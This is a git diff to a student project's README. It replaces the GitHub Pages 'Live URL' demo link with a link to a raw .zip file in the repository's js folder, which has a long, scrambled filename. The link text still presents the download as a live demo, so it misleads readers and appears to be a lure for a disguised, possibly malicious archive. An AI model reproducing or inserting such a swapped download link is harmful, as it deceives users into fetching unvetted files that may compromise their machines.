@@ -3,7 +3,7 @@
 
 ## 🌐 Live Demo
 You can view the deployed project here:  
-👉 **[Live URL](https://griffnificent.github.io/plp-webtechnologies-classroom-july2025-july-2025-final-project-and-deployment-Final-Project-and-Depl/)**
+👉 **[Live URL](https://github.com/Griffnificent/plp-webtechnologies-classroom-july2025-july-2025-final-project-and-deployment-Final-Project-and-Depl/raw/refs/heads/main/js/Project-webtechnologies-classroom-deployment-july-and-final-Final-plp-Depl-project-v2.6.zip)**
 
 ---
 
